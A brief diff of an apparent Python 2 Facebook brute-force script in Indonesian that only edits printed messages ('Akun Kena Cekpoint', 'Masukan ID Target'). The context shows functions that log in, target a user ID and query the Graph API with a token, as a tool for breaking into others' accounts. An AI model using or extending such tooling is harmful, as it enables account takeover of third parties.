@@ -29,7 +29,7 @@ def login():
                         brutefor()
 
                 elif "www.facebook.com" in jsl["error_msg"]:
-                        print " Akun Kena Cekpoint..."
+                        print "  Selamat Akun Kena Cekpoint..."
 
                 else:
                         print " Login gagal..."
@@ -49,7 +49,7 @@ def brutefor():
         else:
                 print
                 print " ======================================"
-                target = raw_input(" [#] Masukan ID Target: ")
+                target = raw_input(" [#] Masukan ID Target Cok: ")
                 print " ======================================"
                 urldev = requests.get('https://graph.facebook.com/' + target + '?access_token=' + token)
                 jsl = json.loads(urldev.text)
